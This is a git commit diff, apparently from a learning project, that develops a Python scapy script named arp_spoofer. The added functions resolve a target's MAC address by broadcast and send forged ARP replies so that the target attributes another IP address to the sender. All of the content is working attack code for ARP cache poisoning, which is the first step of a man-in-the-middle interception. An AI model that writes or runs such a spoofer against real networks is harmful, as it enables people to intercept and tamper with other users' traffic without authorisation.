5deda8778aacc69316c41e380195e6cfe54250c2
Sepp1324 <stoegerer.sebastian@aon.at>
2020-05-20 23:07:35 +0200

    Worked on ARP-Spoofer

--- arp_spoofer/arp_spoofer.py
+++ arp_spoofer/arp_spoofer.py
@@ -2,5 +2,18 @@
 
 import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst="10.0.0.162", hwdst="e4:a7:a0:44:42:01", psrc="10.0.0.138")
-scapy.send(packet)
+
+def get_mac(ip):
+    arp_req = scapy.ARP(pdst=ip)
+    bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_req_bc = bc/arp_req
+    anwsered = scapy.srp(arp_req_bc, timeout=1, verbose=False)[0]
+    return anwsered[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+	target_mac = get_mac(target_ip)
+	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	scapy.send(packet)
+
+get_mac("10.0.0.138")
